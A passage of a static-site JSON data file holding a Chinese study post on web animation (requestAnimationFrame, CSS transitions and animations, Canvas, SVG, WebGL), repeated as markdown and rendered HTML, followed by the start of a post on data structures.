它可以用于绘制图形，制作照片，创建动画，甚至可以进行实时视频处理或者渲染\n  > 它具有如下特点\n* 依赖分辨率，基于位图\n* 不支持事件处理器\n* 弱的文本渲染能力\n* 能够以.pbg 或者.jpg 格式保存结果图像\n* 最适合图像密集型的游戏，其中的许多对象会被频繁重绘\n\n### SVG\n\n* scalable vector graphics==可缩放矢量图形，用来定义用于网络的基于矢量的图形，使用 xml 格式定义图像\n  > 它具有如下特点\n* 不依赖分辨率，基于矢量图\n* 支持事件处理器\n* 最适合带有大型渲染区域的应用程序，如谷歌地图\n* 复杂度高会减慢渲染速度（任何过度使用 dom 的应用都不快）\n* 不适合游戏应用\n\n> svg 示例\n\n```javascript\n<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\">\n  <rect\n    x=\"50\"\n    y=\"20\"\n    rx=\"20\"\n    ry=\"20\"\n    width=\"150\"\n    height=\"150\"\n    style=\"fill:red;stroke:black;stroke-width:5;opacity:0.5\"\n  />\n</svg>\n```\n\n* svg 代码以 svg 根元素开始。\n* width 和 height 设定 svg 文档的高度和宽度\n* version 指定所使用的 svg 版本\n* xmlns 定义 svg 命名空间\n\n### webgl\n\n* webgl 使得网页在支持 canvas 标签的浏览器中，不需要安装任何插件，便可以使用基于 OpenGL ES 2.0 的 api 在 canvas 中进行 3D 渲染。\n* webgl 由 js 控制代码，和在计算机的图形处理单元（GPU）中执行的特效代码(shader code,渲染代码)组成\n\n## 常用的动画库\n\n* [Ani.js--基于 css 动画的生命处理库](http://anijs.github.io/)\n* [Dynamics.js--创建具有物理运动效果动画的 js 库](http://dynamicsjs.com/)\n* [Animate.css--齐全的 css3 动画库](https://daneden.github.io/animate.css/)\n* [Three.js--快速搭建 webgl 项目](https://threejs.org/examples/#webgl_animation_cloth)\n","source":"_posts/study-animate.md","raw":"---\ntitle: 动画了解一下(一)\ndate: 2017-11-23 14:32:05\ntags: css\n---\n\n> 笼统的过一下动画的一些基本概念\n\n## 基本概念\n\n* 帧：在动画过程中，每一幅静止画面即为一“帧”\n* 帧率：即每秒播放的静止画面的数量，单位是 fps(frame per second)或赫兹(Hz)\n* 帧时长：即每一幅静止画面的停留时间，单位一般是毫秒\n* 丢帧：在帧率固定的动画中，某一帧的时长远高于平均帧时长，导致其后续帧被挤压而丢失的现象\n\n> 我们在显示器上看到的动画，每一帧变化都是系统绘制出来的（GPU 或者 CPU）。它的最高绘制频率受限于显示器的刷新频率（而非显卡，大多数都是 60Hz 或者 75Hz）\n\n帧率越高，屏幕上图片闪烁感就越小，稳定性也就越高。人的眼睛不容易察觉 75Hz 以上刷新频率带来的闪烁感。\n\n## 实现方式\n\n> * js：通过定时器（setTimeout 和 setInterval）来改变元素样式，或者使用 requestAnimationFrame\n> * css3:transition 和 animation\n> * html5:使用 html5 提供的绘图方式(canvas/svg/webgl)\n\n### requestAnimationFrame\n\n* 这个 api 是浏览器用于定时循环操作的一个接口，类似于 setTimeout,主要用途是按帧对网页进行重绘\n* 目的是为了让各种网页动画效果（dom 动画，canvas 动画，svg 动画，webgl 动画）能够有一个统一的刷新机制，从而节省系统资源，提供系统性能，改善视觉效果。\n* 代码中使用这个 api，就是告诉浏览器希望执行一个动画，让浏览器在动画帧安排一次重绘。\n* 其接受一个回调作为参数，这个回调函数会在浏览器重绘之前调用，由于功效只是一次性的，所以想实现连续的动效，需要递归调用。\n\n```javascript\n<div id=\"demo\" style=\"position:absolute; width:100px; height:100px; background:#ccc; left:0; top:0;\"></div>\n\n<script>\nvar demo = document.getElementById('demo');\nfunction render(){\n    demo.style.left = parseInt(demo.style.left) + 1 + 'px'; //每一帧向右移动1px\n}\nrequestAnimationFrame(function(){\n    render();\n    //当超过300px后才停止\n    if(parseInt(demo.style.left) <= 300) requestAnimationFrame(arguments.callee);\n});\n</script>\n```\n\n* cancelAnimationFrame 用于取消重绘\n\n```javascipt\nvar requestID = requestAnimationFrame(repeatOften);\ncancelAnimationFrame(requestID);\n```\n\n> 使用 requestAnimationFrame 的优势如下\n\n* 会把每一帧中的所有 dom 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随着显示器的刷新频率（60 或者 75Hz）\n* 在隐藏或不可见的元素中，将不会进行重绘或回流，这就意味着更少的 cpu，gpu 和内存使用量\n* 所以它是性能优化版/专为动画量身打造的 setTimeout，不同的是它不是自己指定回调函数运行的时间，而是跟着浏览器内建的刷新频率来执行回调，这就能达到浏览器所能实现动画的最佳效果\n\n### transition\n\n* css 中的 transition 属性允许块级元素中的属性在指定的时间内平滑的改变\n\n```javascript\ntransition:property duration timing-function delay\n```\n\n* property 是过渡效果的 css 属性的名称，比如 height\n* duration 规定完成过渡效果需要多少毫秒或者秒\n* timing-function 规定速度效果的曲线(linear/ease..)\n* delay 规定过渡效果何时开始\n\n### animation\n\n* 跟 transition 比较，作用于元素本身而不是样式属性,可以使用关键帧的概念，应该说可以实现更自由的动画效果\n\n```javascript\nanimation:name duration timing-function delay iteration-count direction\n```\n\n* name 是需要绑定到选择器的 keyframe 名称\n* duration 规定完成动画所花费的时间，以秒或者毫秒算\n* timing-function 是动画的速度曲线(line/ease..)\n* delay 规定在动画开始之前的延迟\n* iteration-count 规定动画应该播放的次数\n* animation-direction 规定是否应该轮流反向播放动画(normal/alternate)\n\n### Canvas\n\n* html5 新增的元素，作为页面图形绘制的容器，可用于使用 js 中的脚本来绘制图形。\n* 它可以用于绘制图形，制作照片，创建动画，甚至可以进行实时视频处理或者渲染\n  > 它具有如下特点\n* 依赖分辨率，基于位图\n* 不支持事件处理器\n* 弱的文本渲染能力\n* 能够以.pbg 或者.jpg 格式保存结果图像\n* 最适合图像密集型的游戏，其中的许多对象会被频繁重绘\n\n### SVG\n\n* scalable vector graphics==可缩放矢量图形，用来定义用于网络的基于矢量的图形，使用 xml 格式定义图像\n  > 它具有如下特点\n* 不依赖分辨率，基于矢量图\n* 支持事件处理器\n* 最适合带有大型渲染区域的应用程序，如谷歌地图\n* 复杂度高会减慢渲染速度（任何过度使用 dom 的应用都不快）\n* 不适合游戏应用\n\n> svg 示例\n\n```javascript\n<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\">\n  <rect\n    x=\"50\"\n    y=\"20\"\n    rx=\"20\"\n    ry=\"20\"\n    width=\"150\"\n    height=\"150\"\n    style=\"fill:red;stroke:black;stroke-width:5;opacity:0.5\"\n  />\n</svg>\n```\n\n* svg 代码以 svg 根元素开始。\n* width 和 height 设定 svg 文档的高度和宽度\n* version 指定所使用的 svg 版本\n* xmlns 定义 svg 命名空间\n\n### webgl\n\n* webgl 使得网页在支持 canvas 标签的浏览器中，不需要安装任何插件，便可以使用基于 OpenGL ES 2.0 的 api 在 canvas 中进行 3D 渲染。\n* webgl 由 js 控制代码，和在计算机的图形处理单元（GPU）中执行的特效代码(shader code,渲染代码)组成\n\n## 常用的动画库\n\n* [Ani.js--基于 css 动画的生命处理库](http://anijs.github.io/)\n* [Dynamics.js--创建具有物理运动效果动画的 js 库](http://dynamicsjs.com/)\n* [Animate.css--齐全的 css3 动画库](https://daneden.github.io/animate.css/)\n* [Three.js--快速搭建 webgl 项目](https://threejs.org/examples/#webgl_animation_cloth)\n","slug":"study-animate","published":1,"updated":"2018-05-28T03:42:42.686Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034qg00270iofak74hsz3","content":"<blockquote>\n<p>笼统的过一下动画的一些基本概念</p>\n</blockquote>\n<h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><ul>\n<li>帧：在动画过程中，每一幅静止画面即为一“帧”</li>\n<li>帧率：即每秒播放的静止画面的数量，单位是 fps(frame per second)或赫兹(Hz)</li>\n<li>帧时长：即每一幅静止画面的停留时间，单位一般是毫秒</li>\n<li>丢帧：在帧率固定的动画中，某一帧的时长远高于平均帧时长，导致其后续帧被挤压而丢失的现象</li>\n</ul>\n<blockquote>\n<p>我们在显示器上看到的动画，每一帧变化都是系统绘制出来的（GPU 或者 CPU）。它的最高绘制频率受限于显示器的刷新频率（而非显卡，大多数都是 60Hz 或者 75Hz）</p>\n</blockquote>\n<p>帧率越高，屏幕上图片闪烁感就越小，稳定性也就越高。人的眼睛不容易察觉 75Hz 以上刷新频率带来的闪烁感。</p>\n<h2 id=\"实现方式\"><a href=\"#实现方式\" class=\"headerlink\" title=\"实现方式\"></a>实现方式</h2><blockquote>\n<ul>\n<li>js：通过定时器（setTimeout 和 setInterval）来改变元素样式，或者使用 requestAnimationFrame</li>\n<li>css3:transition 和 animation</li>\n<li>html5:使用 html5 提供的绘图方式(canvas/svg/webgl)</li>\n</ul>\n</blockquote>\n<h3 id=\"requestAnimationFrame\"><a href=\"#requestAnimationFrame\" class=\"headerlink\" title=\"requestAnimationFrame\"></a>requestAnimationFrame</h3><ul>\n<li>这个 api 是浏览器用于定时循环操作的一个接口，类似于 setTimeout,主要用途是按帧对网页进行重绘</li>\n<li>目的是为了让各种网页动画效果（dom 动画，canvas 动画，svg 动画，webgl 动画）能够有一个统一的刷新机制，从而节省系统资源，提供系统性能，改善视觉效果。</li>\n<li>代码中使用这个 api，就是告诉浏览器希望执行一个动画，让浏览器在动画帧安排一次重绘。</li>\n<li>其接受一个回调作为参数，这个回调函数会在浏览器重绘之前调用，由于功效只是一次性的，所以想实现连续的动效，需要递归调用。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=<span class=\"string\">\"demo\"</span> style=<span class=\"string\">\"position:absolute; width:100px; height:100px; background:#ccc; left:0; top:0;\"</span>&gt;&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"keyword\">var</span> demo = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'demo'</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    demo.style.left = <span class=\"built_in\">parseInt</span>(demo.style.left) + <span class=\"number\">1</span> + <span class=\"string\">'px'</span>; <span class=\"comment\">//每一帧向右移动1px</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">requestAnimationFrame(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    render();</span><br><span class=\"line\">    <span class=\"comment\">//当超过300px后才停止</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">parseInt</span>(demo.style.left) &lt;= <span class=\"number\">300</span>) requestAnimationFrame(<span class=\"built_in\">arguments</span>.callee);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>cancelAnimationFrame 用于取消重绘</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var requestID = requestAnimationFrame(repeatOften);</span><br><span class=\"line\">cancelAnimationFrame(requestID);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>使用 requestAnimationFrame 的优势如下</p>\n</blockquote>\n<ul>\n<li>会把每一帧中的所有 dom 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随着显示器的刷新频率（60 或者 75Hz）</li>\n<li>在隐藏或不可见的元素中，将不会进行重绘或回流，这就意味着更少的 cpu，gpu 和内存使用量</li>\n<li>所以它是性能优化版/专为动画量身打造的 setTimeout，不同的是它不是自己指定回调函数运行的时间，而是跟着浏览器内建的刷新频率来执行回调，这就能达到浏览器所能实现动画的最佳效果</li>\n</ul>\n<h3 id=\"transition\"><a href=\"#transition\" class=\"headerlink\" title=\"transition\"></a>transition</h3><ul>\n<li>css 中的 transition 属性允许块级元素中的属性在指定的时间内平滑的改变</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">transition:property duration timing-<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">delay</span></span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>property 是过渡效果的 css 属性的名称，比如 height</li>\n<li>duration 规定完成过渡效果需要多少毫秒或者秒</li>\n<li>timing-function 规定速度效果的曲线(linear/ease..)</li>\n<li>delay 规定过渡效果何时开始</li>\n</ul>\n<h3 id=\"animation\"><a href=\"#animation\" class=\"headerlink\" title=\"animation\"></a>animation</h3><ul>\n<li>跟 transition 比较，作用于元素本身而不是样式属性,可以使用关键帧的概念，应该说可以实现更自由的动画效果</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">animation:name duration timing-<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">delay</span> <span class=\"title\">iteration</span>-<span class=\"title\">count</span> <span class=\"title\">direction</span></span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>name 是需要绑定到选择器的 keyframe 名称</li>\n<li>duration 规定完成动画所花费的时间，以秒或者毫秒算</li>\n<li>timing-function 是动画的速度曲线(line/ease..)</li>\n<li>delay 规定在动画开始之前的延迟</li>\n<li>iteration-count 规定动画应该播放的次数</li>\n<li>animation-direction 规定是否应该轮流反向播放动画(normal/alternate)</li>\n</ul>\n<h3 id=\"Canvas\"><a href=\"#Canvas\" class=\"headerlink\" title=\"Canvas\"></a>Canvas</h3><ul>\n<li>html5 新增的元素，作为页面图形绘制的容器，可用于使用 js 中的脚本来绘制图形。</li>\n<li>它可以用于绘制图形，制作照片，创建动画，甚至可以进行实时视频处理或者渲染<blockquote>\n<p>它具有如下特点</p>\n</blockquote>\n</li>\n<li>依赖分辨率，基于位图</li>\n<li>不支持事件处理器</li>\n<li>弱的文本渲染能力</li>\n<li>能够以.pbg 或者.jpg 格式保存结果图像</li>\n<li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li>\n</ul>\n<h3 id=\"SVG\"><a href=\"#SVG\" class=\"headerlink\" title=\"SVG\"></a>SVG</h3><ul>\n<li>scalable vector graphics==可缩放矢量图形，用来定义用于网络的基于矢量的图形，使用 xml 格式定义图像<blockquote>\n<p>它具有如下特点</p>\n</blockquote>\n</li>\n<li>不依赖分辨率，基于矢量图</li>\n<li>支持事件处理器</li>\n<li>最适合带有大型渲染区域的应用程序，如谷歌地图</li>\n<li>复杂度高会减慢渲染速度（任何过度使用 dom 的应用都不快）</li>\n<li>不适合游戏应用</li>\n</ul>\n<blockquote>\n<p>svg 示例</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg xmlns=<span class=\"string\">\"http://www.w3.org/2000/svg\"</span> version=<span class=\"string\">\"1.1\"</span>&gt;</span><br><span class=\"line\">  &lt;rect</span><br><span class=\"line\">    x=<span class=\"string\">\"50\"</span></span><br><span class=\"line\">    y=<span class=\"string\">\"20\"</span></span><br><span class=\"line\">    rx=<span class=\"string\">\"20\"</span></span><br><span class=\"line\">    ry=<span class=\"string\">\"20\"</span></span><br><span class=\"line\">    width=<span class=\"string\">\"150\"</span></span><br><span class=\"line\">    height=<span class=\"string\">\"150\"</span></span><br><span class=\"line\">    style=<span class=\"string\">\"fill:red;stroke:black;stroke-width:5;opacity:0.5\"</span></span><br><span class=\"line\">  /&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/svg&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>svg 代码以 svg 根元素开始。</li>\n<li>width 和 height 设定 svg 文档的高度和宽度</li>\n<li>version 指定所使用的 svg 版本</li>\n<li>xmlns 定义 svg 命名空间</li>\n</ul>\n<h3 id=\"webgl\"><a href=\"#webgl\" class=\"headerlink\" title=\"webgl\"></a>webgl</h3><ul>\n<li>webgl 使得网页在支持 canvas 标签的浏览器中，不需要安装任何插件，便可以使用基于 OpenGL ES 2.0 的 api 在 canvas 中进行 3D 渲染。</li>\n<li>webgl 由 js 控制代码，和在计算机的图形处理单元（GPU）中执行的特效代码(shader code,渲染代码)组成</li>\n</ul>\n<h2 id=\"常用的动画库\"><a href=\"#常用的动画库\" class=\"headerlink\" title=\"常用的动画库\"></a>常用的动画库</h2><ul>\n<li><a href=\"http://anijs.github.io/\" target=\"_blank\" rel=\"noopener\">Ani.js–基于 css 动画的生命处理库</a></li>\n<li><a href=\"http://dynamicsjs.com/\" target=\"_blank\" rel=\"noopener\">Dynamics.js–创建具有物理运动效果动画的 js 库</a></li>\n<li><a href=\"https://daneden.github.io/animate.css/\" target=\"_blank\" rel=\"noopener\">Animate.css–齐全的 css3 动画库</a></li>\n<li><a href=\"https://threejs.org/examples/#webgl_animation_cloth\" target=\"_blank\" rel=\"noopener\">Three.js–快速搭建 webgl 项目</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>笼统的过一下动画的一些基本概念</p>\n</blockquote>\n<h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><ul>\n<li>帧：在动画过程中，每一幅静止画面即为一“帧”</li>\n<li>帧率：即每秒播放的静止画面的数量，单位是 fps(frame per second)或赫兹(Hz)</li>\n<li>帧时长：即每一幅静止画面的停留时间，单位一般是毫秒</li>\n<li>丢帧：在帧率固定的动画中，某一帧的时长远高于平均帧时长，导致其后续帧被挤压而丢失的现象</li>\n</ul>\n<blockquote>\n<p>我们在显示器上看到的动画，每一帧变化都是系统绘制出来的（GPU 或者 CPU）。它的最高绘制频率受限于显示器的刷新频率（而非显卡，大多数都是 60Hz 或者 75Hz）</p>\n</blockquote>\n<p>帧率越高，屏幕上图片闪烁感就越小，稳定性也就越高。人的眼睛不容易察觉 75Hz 以上刷新频率带来的闪烁感。</p>\n<h2 id=\"实现方式\"><a href=\"#实现方式\" class=\"headerlink\" title=\"实现方式\"></a>实现方式</h2><blockquote>\n<ul>\n<li>js：通过定时器（setTimeout 和 setInterval）来改变元素样式，或者使用 requestAnimationFrame</li>\n<li>css3:transition 和 animation</li>\n<li>html5:使用 html5 提供的绘图方式(canvas/svg/webgl)</li>\n</ul>\n</blockquote>\n<h3 id=\"requestAnimationFrame\"><a href=\"#requestAnimationFrame\" class=\"headerlink\" title=\"requestAnimationFrame\"></a>requestAnimationFrame</h3><ul>\n<li>这个 api 是浏览器用于定时循环操作的一个接口，类似于 setTimeout,主要用途是按帧对网页进行重绘</li>\n<li>目的是为了让各种网页动画效果（dom 动画，canvas 动画，svg 动画，webgl 动画）能够有一个统一的刷新机制，从而节省系统资源，提供系统性能，改善视觉效果。</li>\n<li>代码中使用这个 api，就是告诉浏览器希望执行一个动画，让浏览器在动画帧安排一次重绘。</li>\n<li>其接受一个回调作为参数，这个回调函数会在浏览器重绘之前调用，由于功效只是一次性的，所以想实现连续的动效，需要递归调用。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=<span class=\"string\">\"demo\"</span> style=<span class=\"string\">\"position:absolute; width:100px; height:100px; background:#ccc; left:0; top:0;\"</span>&gt;&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"keyword\">var</span> demo = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'demo'</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    demo.style.left = <span class=\"built_in\">parseInt</span>(demo.style.left) + <span class=\"number\">1</span> + <span class=\"string\">'px'</span>; <span class=\"comment\">//每一帧向右移动1px</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">requestAnimationFrame(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    render();</span><br><span class=\"line\">    <span class=\"comment\">//当超过300px后才停止</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">parseInt</span>(demo.style.left) &lt;= <span class=\"number\">300</span>) requestAnimationFrame(<span class=\"built_in\">arguments</span>.callee);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>cancelAnimationFrame 用于取消重绘</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var requestID = requestAnimationFrame(repeatOften);</span><br><span class=\"line\">cancelAnimationFrame(requestID);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>使用 requestAnimationFrame 的优势如下</p>\n</blockquote>\n<ul>\n<li>会把每一帧中的所有 dom 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随着显示器的刷新频率（60 或者 75Hz）</li>\n<li>在隐藏或不可见的元素中，将不会进行重绘或回流，这就意味着更少的 cpu，gpu 和内存使用量</li>\n<li>所以它是性能优化版/专为动画量身打造的 setTimeout，不同的是它不是自己指定回调函数运行的时间，而是跟着浏览器内建的刷新频率来执行回调，这就能达到浏览器所能实现动画的最佳效果</li>\n</ul>\n<h3 id=\"transition\"><a href=\"#transition\" class=\"headerlink\" title=\"transition\"></a>transition</h3><ul>\n<li>css 中的 transition 属性允许块级元素中的属性在指定的时间内平滑的改变</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">transition:property duration timing-<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">delay</span></span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>property 是过渡效果的 css 属性的名称，比如 height</li>\n<li>duration 规定完成过渡效果需要多少毫秒或者秒</li>\n<li>timing-function 规定速度效果的曲线(linear/ease..)</li>\n<li>delay 规定过渡效果何时开始</li>\n</ul>\n<h3 id=\"animation\"><a href=\"#animation\" class=\"headerlink\" title=\"animation\"></a>animation</h3><ul>\n<li>跟 transition 比较，作用于元素本身而不是样式属性,可以使用关键帧的概念，应该说可以实现更自由的动画效果</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">animation:name duration timing-<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">delay</span> <span class=\"title\">iteration</span>-<span class=\"title\">count</span> <span class=\"title\">direction</span></span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>name 是需要绑定到选择器的 keyframe 名称</li>\n<li>duration 规定完成动画所花费的时间，以秒或者毫秒算</li>\n<li>timing-function 是动画的速度曲线(line/ease..)</li>\n<li>delay 规定在动画开始之前的延迟</li>\n<li>iteration-count 规定动画应该播放的次数</li>\n<li>animation-direction 规定是否应该轮流反向播放动画(normal/alternate)</li>\n</ul>\n<h3 id=\"Canvas\"><a href=\"#Canvas\" class=\"headerlink\" title=\"Canvas\"></a>Canvas</h3><ul>\n<li>html5 新增的元素，作为页面图形绘制的容器，可用于使用 js 中的脚本来绘制图形。</li>\n<li>它可以用于绘制图形，制作照片，创建动画，甚至可以进行实时视频处理或者渲染<blockquote>\n<p>它具有如下特点</p>\n</blockquote>\n</li>\n<li>依赖分辨率，基于位图</li>\n<li>不支持事件处理器</li>\n<li>弱的文本渲染能力</li>\n<li>能够以.pbg 或者.jpg 格式保存结果图像</li>\n<li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li>\n</ul>\n<h3 id=\"SVG\"><a href=\"#SVG\" class=\"headerlink\" title=\"SVG\"></a>SVG</h3><ul>\n<li>scalable vector graphics==可缩放矢量图形，用来定义用于网络的基于矢量的图形，使用 xml 格式定义图像<blockquote>\n<p>它具有如下特点</p>\n</blockquote>\n</li>\n<li>不依赖分辨率，基于矢量图</li>\n<li>支持事件处理器</li>\n<li>最适合带有大型渲染区域的应用程序，如谷歌地图</li>\n<li>复杂度高会减慢渲染速度（任何过度使用 dom 的应用都不快）</li>\n<li>不适合游戏应用</li>\n</ul>\n<blockquote>\n<p>svg 示例</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg xmlns=<span class=\"string\">\"http://www.w3.org/2000/svg\"</span> version=<span class=\"string\">\"1.1\"</span>&gt;</span><br><span class=\"line\">  &lt;rect</span><br><span class=\"line\">    x=<span class=\"string\">\"50\"</span></span><br><span class=\"line\">    y=<span class=\"string\">\"20\"</span></span><br><span class=\"line\">    rx=<span class=\"string\">\"20\"</span></span><br><span class=\"line\">    ry=<span class=\"string\">\"20\"</span></span><br><span class=\"line\">    width=<span class=\"string\">\"150\"</span></span><br><span class=\"line\">    height=<span class=\"string\">\"150\"</span></span><br><span class=\"line\">    style=<span class=\"string\">\"fill:red;stroke:black;stroke-width:5;opacity:0.5\"</span></span><br><span class=\"line\">  /&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/svg&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>svg 代码以 svg 根元素开始。</li>\n<li>width 和 height 设定 svg 文档的高度和宽度</li>\n<li>version 指定所使用的 svg 版本</li>\n<li>xmlns 定义 svg 命名空间</li>\n</ul>\n<h3 id=\"webgl\"><a href=\"#webgl\" class=\"headerlink\" title=\"webgl\"></a>webgl</h3><ul>\n<li>webgl 使得网页在支持 canvas 标签的浏览器中，不需要安装任何插件，便可以使用基于 OpenGL ES 2.0 的 api 在 canvas 中进行 3D 渲染。</li>\n<li>webgl 由 js 控制代码，和在计算机的图形处理单元（GPU）中执行的特效代码(shader code,渲染代码)组成</li>\n</ul>\n<h2 id=\"常用的动画库\"><a href=\"#常用的动画库\" class=\"headerlink\" title=\"常用的动画库\"></a>常用的动画库</h2><ul>\n<li><a href=\"http://anijs.github.io/\" target=\"_blank\" rel=\"noopener\">Ani.js–基于 css 动画的生命处理库</a></li>\n<li><a href=\"http://dynamicsjs.com/\" target=\"_blank\" rel=\"noopener\">Dynamics.js–创建具有物理运动效果动画的 js 库</a></li>\n<li><a href=\"https://daneden.github.io/animate.css/\" target=\"_blank\" rel=\"noopener\">Animate.css–齐全的 css3 动画库</a></li>\n<li><a href=\"https://threejs.org/examples/#webgl_animation_cloth\" target=\"_blank\" rel=\"noopener\">Three.js–快速搭建 webgl 项目</a></li>\n</ul>\n"},{"title":"浅谈各种数据结构","date":"2018-04-17T02:58:35.000Z","_content":"\n> 列表，栈，队列，链表，字典，散列，图，二叉查找树\n\n## 列表\n\n* 日常生活中：购物清单，待办事项列表等\n* 数据结构较为简单\n* 不需要在一个长序列中查找元素，或者对其进行排序\n\n## 栈\n\n* 栈是一种特殊的列表，只能通过列表的一端进行访问，这一端被称为栈顶\n* 餐厅里的盘子叠在一起，从最上面取盘子，洗完也只能放在上面\n* 所以他是先进后出，后入先出的高效数据结构，因为数据只能在栈顶添加或删除，所以操作很快\n* 比如函数调用栈\n\n## 队列\n\n* 队列也是一种特殊的列表\n* 只能在队尾添加元素（入队），只能在队头删除元素（出队）\n* 我们在银行排队，排在最前面的人第一个办理业务，然后出去\n\n## 链表\n\n* 链表也是一种特殊的列表\n* 每个节点存下个节点的指针\n* 有双向链表，单向链表，循环链表\n\n## 字典\n\n* 键值对的存储结构\n\n## 散列\n\n* （散列）哈希表是一种常用的数据结构，散列后的数据可以快速插入\n* 在散列表上插入，删除都非常快，但是查找效率非常低\n* 查找一组数组中的最大值和最小值，一般要求助于其他数据结构，比如二叉查找树\n* 即使一个高效的散列函数，也可能将两个键映射为同一个值的可能，这种现象叫碰撞。常见碰撞的处理方法：开链法和线性探测法\n\n## 图\n\n* 图是由边的集合和顶点的集合组成\n* 两个城镇由某种道路相连，每个城镇是一个顶点，道路就是边\n* 顶点也有权重，也叫成本\n* 如果一个图的顶点对是有序的：有向图==流程图\n* 如果无序，就是无序图\n* 搜索图的算法：深度优先搜素和广度优先搜索\n\n## 